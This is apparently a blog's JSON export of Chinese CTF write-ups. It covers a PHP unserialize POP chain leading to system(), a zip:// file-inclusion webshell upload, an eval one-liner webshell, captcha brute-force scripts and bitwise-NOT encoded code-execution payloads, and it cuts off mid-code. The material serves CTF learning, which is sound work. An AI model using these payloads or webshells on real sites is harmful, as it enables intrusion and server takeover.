▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒██████████████▒▒██████████████████▒▒▒▒▒▒▒▒▒▒▒▒██████████████████▒▒▒▒▒▒▒▒██████████████████████████████▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒--&gt;&lt;script src=&quot;//cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;snowfall&quot;&gt;&lt;/div&gt;&lt;script&gt; particlesJS(&quot;snowfall&quot;, &#123; &quot;particles&quot;: &#123; &quot;number&quot;: &#123; &quot;value&quot;: 100 &#125;, &quot;shape&quot;: &#123; &quot;type&quot;: &quot;circle&quot; &#125;, &quot;size&quot;: &#123; &quot;value&quot;: 10, &quot;random&quot;: true &#125;, &quot;line_linked&quot;: &#123; &quot;enable&quot;: false &#125;, &quot;move&quot;: &#123; &quot;enable&quot;: true, &quot;speed&quot;: 2, &quot;direction&quot;: &quot;bottom&quot;, &quot;straight&quot;: false &#125; &#125;, &quot;interactivity&quot;: &#123; &quot;detect_on&quot;: &quot;canvas&quot;, &quot;events&quot;: &#123; &quot;onhover&quot;: &#123; &quot;enable&quot;: false &#125; &#125;, &quot;modes&quot;: &#123; &quot;push&quot;: &#123; &quot;particles_nb&quot;: 12 &#125; &#125; &#125; &#125;);&lt;/script&gt;&lt;!--&lt;a href=&quot;/?whatareyounongshane=src&quot;&gt;我真的是源码?&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=cmd&quot;&gt;干点好事!&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=upload&quot;&gt;送点东西!&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=tellmetruth&quot;&gt;快告诉我真相!&lt;/a&gt;--&gt;&lt;/body&gt;所以哪个ISCC是真的？ 然后能支离破碎的把每一处的问题解决，比如session变量覆盖isccIsCciScc1scc，但是我却找不到怎么把他们穿起来，后来问了带师傅才知道原来可以强行的把他们穿起来,payload： 12345678$cmd = new ISCC_ResetCMD();$upload = new ISCC_Upload();$tellme = new ISCC_TellMeTruth();$com = new ISCC_Command();$upload-&gt;staasdtus = $cmd;$cmd-&gt;is_upload = $tellme;$cmd-&gt;status = $com; 可以看见upload这个类是没有我随便写的这个属性的，但是依然不影响我们进行操作，destruct和 wakeup依然会执行，既然知道这个知识点那么就很简单了，直接把他们连起来就可以了 思路: 修改session-&gt;控制cmd-&gt;执行 图片上传的时候同时再穿一个text上去 12345------WebKitFormBoundaryANIrb3jmbjSiBlbnContent-Disposition: form-data; name&#x3D;&quot;_SESSION&quot;; filename&#x3D;&quot;isccIsCciScc1scc&quot;Content-Type: text&#x2F;plainwdnmd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285&lt;?phpsession_start();ini_set(&#x27;max_execution_time&#x27;, &#x27;5&#x27;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123; function __wakeup() &#123; global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = (count($_FILES) &gt; 0); &#125; function __destruct() &#123; global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) &#123; foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file[&#x27;tmp_name&#x27;])) &#123; $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) &#123; $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) &#123; echo &quot;想啥呢？有东西了……&lt;br&gt;&quot;; finalize(); exit; &#125; if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123; echo &quot;东西塞不进去~&lt;br&gt;&quot;; finalize(); exit; &#125; if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123; echo &quot;我拿到了！&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; &#125; else &#123; echo &quot;拿不到:(&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; else &#123; finalize(); exit; &#125; &#125; else &#123; echo &quot;你真是个天才!&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; &#125;&#125;class ISCC_ResetCMD &#123; protected $new_cmd=&quot;ls&quot;; function __wakeup() &#123; global $cmd; global $is_upload; global $status; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:6:&quot;whoami&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125; if(!isset($this-&gt;new_cmd)) &#123;// phpinfo(); $status = &quot;error&quot;; $error = &quot;你这罐子是空的!&quot;; throw new Exception($error); &#125; if(!is_string($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &#x27;东西都没给对!&#x27;; throw new Exception($error); &#125; &#125; function __destruct() &#123; global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION[&#x27;name&#x27;] === &#x27;isccIsCciScc1scc&#x27;) &#123; $cmd = $this-&gt;new_cmd; &#125; &#125;&#125;class ISCC_Login &#123; function __wakeup() &#123;// phpinfo(); $this-&gt;login(); &#125; function __destruct() &#123;// phpinfo(); $this-&gt;logout(); &#125; function login() &#123;// phpinfo(); $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET[&#x27;pAssM0rd&#x27;] === $pAssM0rd) $_SESSION[&#x27;name&#x27;] = &quot;isccIsCciScc1scc&quot;; &#125; function logout() &#123; global $status; unset($_SESSION[&#x27;name&#x27;]); $status = &quot;finish&quot;; &#125;&#125;class ISCC_TellMeTruth &#123; function __wakeup() &#123; if(!isset($_SESSION[&#x27;name&#x27;])) $_SESSION[&#x27;name&#x27;] = randstr(14); echo &quot;似乎这个 &quot;.$_SESSION[&#x27;name&#x27;].&quot; 是真相&lt;br&gt;&quot;; &#125; function __destruct() &#123; echo &quot;似乎这个 &quot;.$_SESSION[&#x27;name&#x27;].&quot; 是真相&lt;br&gt;&quot;; &#125;&#125;class ISCC_Command &#123; function __wakeup() &#123; global $cmd; global $is_upload; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; &#125; function __toString() &#123; global $cmd; return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;; &#125; function __destruct() &#123; global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) &#123; echo &quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;; echo &quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; &#125; &#125;&#125;function randstr($len)&#123; $characters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;; $randstring = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; $randstring .= $characters[rand(0, strlen($characters))]; &#125; return $randstring;&#125;function waf($s) &#123;// phpinfo(); if(stripos($s, &quot;*&quot;) !== FALSE)// phpinfo(); return false;// phpinfo(); return true;&#125;function finalize() &#123; $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;nonono&quot;;&#125;if(isset($_GET[&#x27;whatareyounongshane&#x27;])) &#123; $whatareyounongshane = $_GET[&#x27;whatareyounongshane&#x27;]; switch ($whatareyounongshane) &#123; case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;想越级干好事？还是有门的……&quot;; header(&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;); break; case &quot;reset&quot;: echo &quot;几辈子积累的好运就在这时~:p&quot;; header(&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header(&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;); break; default: echo &quot;空空如也就是我！&quot;; &#125; finalize(); die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);&#125;$cmd = new ISCC_ResetCMD();$upload = new ISCC_Upload();$tellme = new ISCC_TellMeTruth();$com = new ISCC_Command();$upload-&gt;staasdtus = $cmd;$cmd-&gt;is_upload = $tellme;$cmd-&gt;status = $com;echo(serialize($upload));//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:2:&#123;s:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;if(($a)) &#123; $wtf = waf($a) ? $a : (finalize() &amp;&amp; die(&quot;试试就“逝世”!&quot;));// phpinfo();// echo $wtf; if($goodshit = @unserialize($wtf)) &#123;// phpinfo(); $is_unser_finished = true;// var_dump($is_unser_finished); &#125;// phpinfo();// var_dump(unserialize(&quot;O:11:\\&quot;ISCC_Upload\\&quot;:1:&#123;s:6:\\&quot;status\\&quot;;O:13:\\&quot;ISCC_ResetCMD\\&quot;:3:&#123;S:10:\\&quot;\\00\\2A\\00new_cmd\\&quot;;s:6:\\&quot;whoami\\&quot;;s:9:\\&quot;is_upload\\&quot;;O:16:\\&quot;ISCC_TellMeTruth\\&quot;:0:&#123;&#125;s:6:\\&quot;status\\&quot;;O:12:\\&quot;ISCC_Command\\&quot;:0:&#123;&#125;&#125;&#125;&quot;)); var_dump($status); if(in_array($status, array(&#x27;new&#x27;, &#x27;cmd&#x27;, &#x27;upload_ok&#x27;, &#x27;upload_fail&#x27;, &#x27;reset&#x27;), true)) finalize();// phpinfo(); die(&quot;\\n所以哪个ISCC是真的？&quot;);&#125;?&gt; 绕过 * 操作： 12345当PHP反序列化的s换成S的时候就可以是用十六进制来操作~O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;s:10:&quot; * new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"2020极客大挑战","slug":"2020极客大挑战","date":"2021-04-27T05:50:31.000Z","updated":"2021-05-03T04:53:17.963Z","comments":true,"path":"2021/04/27/2020极客大挑战/","link":"","permalink":"http://example.com/2021/04/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"Roamphp2-Myblog先是伪协议到处读文件.. 分别能读到home.php,login.php,secret.php，然后在login.php下看html能读到/admin/user.php 感觉像是伪随机数爆破.. 审计代码后发现其实是可以绕过的，因为判断中对$_SESSIONpassword进行了对比，如果想要绕过的话将两者都是作为空即可 故我们直接构造payload 123cookies:username&#x3D;Longlone&amp;password&#x3D; 登陆上之后就可以找到上传点，给出了源码： 12345678910111213141516&lt;?php if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123; $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;]; $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;]; if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123; $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;); if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123; $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;; &#125; &#125; &#125; ?&gt; 上传之后我们再去index.php包含不就好了吗！。想到这里我们马上操作.结果突然想到在文件的最后会被加上php后缀名,这就没办法直接读取了,只能通过zip协议 伪协议: file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data:// 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;148886.html 题外话: 12345http://127.0.0.1/cmd.php?file=php://input[POST DATA] &lt;?php phpinfo()?&gt;也可以POST如下内容生成一句话： &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt; 那么这样就简单了，写一个shell.php，然后压缩，再改后缀为jpg即可, payload： 1http:&#x2F;&#x2F;0dad2d9e-f7fb-4cb0-905a-9860648d77ec.node3.buuoj.cn&#x2F;?page&#x3D;zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;upload&#x2F;d03ea7c190280b2369947674c89fb32c6e98f591.jpg%23shell Roamphp4-Rceme文件泄露..swp的文件泄露是通过 .filename.swp的，比如： 12index.php.index.php.swp 脱下来之后得到源码： 1234567891011121314151617181920212223242526272829303132333435/************************************ author : Longlone* type : Backup***********************************/&lt;?phperror_reporting(0);session_start();if(!isset($_SESSION[&#x27;code&#x27;]))&#123; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5);&#125;if(isset($_POST[&#x27;cmd&#x27;]) and isset($_POST[&#x27;code&#x27;]))&#123; if(substr(md5($_POST[&#x27;code&#x27;]),0,5) !== $_SESSION[&#x27;code&#x27;])&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Captcha error~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST[&#x27;cmd&#x27;]; if(strlen($code) &gt; 70 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm&#x27;,$code))&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Longlone not like you~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123; @eval($code); die(); &#125;&#125;?&gt; code我们可以通过爆破来得到： 1234567891011&lt;?php$a = 0;while (true) &#123; if (substr(md5($a), 0, 5) == &quot;f815a&quot;) &#123; die($a.&quot;\\n&quot;); &#125; else &#123; $a++; &#125;&#125; 六位数以下都可以爆破..超过六位数的话会很难出 这里再贴上一个别的师傅的python的： 12345678910111213141516171819202122232425262728293031323334import hashlibfrom multiprocessing.dummy import Pool as ThreadPool# MD5截断数值已知 求原始数据# 例子 substr(md5(captcha), 0, 6)=60b7efdef md5(s): # 计算MD5字符串 return hashlib.md5(str(s).encode(&#x27;utf-8&#x27;)).hexdigest()keymd5 = &#x27;2e2f0&#x27; # 已知的md5截断值md5start = 0 # 设置题目已知的截断位置md5length = 5def findmd5(sss): # 输入范围 里面会进行md5测试 key = sss.split(&#x27;:&#x27;) start = int(key[0]) # 开始位置 end = int(key[1]) # 结束位置 result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:5] == keymd5: # 拿到加密字符串 result = i print(result) # 打印 breaklist=[] # 参数列表for i in range(10): # 多线程的数字列表 开始与结尾 list.append(str(10000000*i) + &#x27;:&#x27; + str(10000000*(i+1)))pool = ThreadPool() # 多线程任务pool.map(findmd5, list) # 函数与参数列表pool.close()pool.join() （顺便php的性能跑得比python快很多啊 异或这题挣不出来，思路不是这个，但是依然贴个异或脚本过来： 1234567891011121314151617181920&lt;?phphighlight_file(__file__);$a = &#x27;~!@#$%^&amp;*()_+\\|/?.,&lt;&gt;`-=&#123;&#125;[]&#x27;;for($i = 0;$i&lt;strlen($a);$i++)&#123; for($j = 0;$j&lt;strlen($a);$j++)&#123; if (ord($a[$i]^$a[$j])&gt;64 &amp;&amp; ord($a[$i]^$a[$j])&lt;91)&#123; echo $a[$i]. &#x27; xor &#x27; .$a[$j]. &#x27; is &#x27;; echo chr(ord($a[$i]^$a[$j])). &#x27; &#x27;; echo ord($a[$i]^$a[$j]); echo &quot;\\n&lt;br&gt;&quot;; &#125;elseif (ord($a[$i]^$a[$j])&gt;96 &amp;&amp; ord($a[$i]^$a[$j])&lt;122)&#123; echo $a[$i]. &#x27; xor &#x27; .$a[$j]. &#x27; is &#x27;; echo chr(ord($a[$i]^$a[$j])). &#x27; &#x27;; echo &#x27; &#x27; .ord($a[$i]^$a[$j]); echo &quot;\\n&quot;; &#125; &#125;&#125;?&gt; 12345678910111213141516vaild = &quot;!@&amp;%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;?-=_`~&quot;answer =&quot;phpinfo&quot;tmp,tmp2 = &#x27;&#x27;,&#x27;&#x27;for c in answer: for i in vaild: for j in vaild: if ord(i)^ord(j) ==ord(c): tmp+=j tmp+=i break else: continue breakprint(tmp,tmp2) 回到题目，这里需要一个trick，取反的时候其实可以用 1[~取反值][!%FF] 这样来构造..我们先试试看执行phpinfo(); 1cmd=[~%8F%97%8F%96%91%99%90][!%FF]();&amp;code=653808 发现成功执行。【顺便踩坑，不能用postman去做，自己在这里卡了好久 = = 卧槽 再之后尝试配合着打无参数RCE 膜王叹之师傅【 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12311239.html 收集知识： 12current(localeconv());pos(localeconv()) 就是两个点，所以我们可以用这两个扫目录： 1print_r(scandir(current(localeconv()))) 取反一波： 12345678910111213141516&lt;?php//$a = &quot;%8C%86%8C%8B%9A%92&quot;;//echo (~urldecode($a));$b = &quot;localeconv&quot;;echo urlencode((~$b));//print_r(scandir(pos(localeconv())))//var_dump =%89%9E%8D%A0%9B%8A%92%8F//getallheaders =%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());//phpinfo [~%8F%97%8F%96%91%99%90][!%FF]();//print_r %8F%8D%96%91%8B%A0%8D//scandir %8C%9C%9E%91%9B%96%8D//current %9C%8A%8D%8D%9A%91%8B//pos %8F%90%8C//localeconv %93%90%9C%9E%93%9A%9C%90%91%89//拼起来：[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]()))); 得出： 1cmd=[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));&amp;code=217941 结果flag不在这里，wdnmd。如果一直跟到根目录的话实在太恶心太长了。 转换一下思路好了： 1system(hex2bin(session_id(session_start())); 现在可以了 1[~%8C%86%8C%8B%9A%92][!%FF]([~%97%9A%87%CD%9D%96%91][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()))); 但是在这种思路下的话，因为拥有空格，就会导致每次的验证码都不停的在变就很烦，所以我们每次都会遭遇验证码错误。。没办法用空格的话再用${IFS}$9试试看 结果依然出不来。。很烦，不知道为什么，MD，。大概是cookies不允许，想了想整个别的活 1eval(session_id(session_start())); 1[~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]())); 结果想法依然没办法成功，cookies只要携带特殊符号就会验证码不通过，这下就恶心到我了。 翻出别人的总结: 123456789101112131415161718getchwd() 函数返回当前工作目录。scandir() 函数返回指定目录中的文件和目录的数组。dirname() 函数返回路径中的目录部分。chdir() 函数改变当前的目录。readfile() 输出一个文件current() 返回数组中的当前单元, 默认取第一个值pos() current() 的别名next() 函数将内部指针指向数组中的下一个元素，并输出。end() 将内部指针指向数组中的最后一个元素，并输出。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回chr() 函数从指定的 ASCII 值返回字符。hex2bin — 转换十六进制字符串为二进制字符串getenv() 获取一个环境变量的值(在7.1之后可以不给予参数) 那么我们来构建 1system(current(getallheaders())); 1234567891011121314//system %8C%86%8C%8B%9A%92//session_id %8C%9A%8C%8C%96%90%91%A0%96%9B//session_start %8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B// %9A%89%9E%93//拼出来 [~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()));// system(pos(getallheaders()))//var_dump %89%9E%8D%A0%9B%8A%92%8F//system %8C%86%8C%8B%9A%92//pos %8F%90%8C//getallheaders %98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C//拼出来 [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));//var_dump(pos(getallheaders()))//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); 发现首位不可以用，我们再next一下 最后拼接出来 1system(next(getallheaders())); 1cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&amp;code=351355","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"NCTF2018_eating_cms","slug":"NCTF2018-eating-cms","date":"2021-04-26T13:19:17.000Z","updated":"2021-04-26T13:43:04.283Z","comments":true,"path":"2021/04/26/NCTF2018-eating-cms/","link":"","permalink":"http://example.com/2021/04/26/NCTF2018-eating-cms/","excerpt":"","text":"知识点：这题学到的东西是： 当命令执行../被过滤的时候可以用cd ..;ls ..的方式逐步向上操作。 做题思路：开局有个login,登陆的时候 所以猜测他有注册页面，注册一下就进去了，进去之后就发现： 尝试用伪协议读取文件，找到function.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if 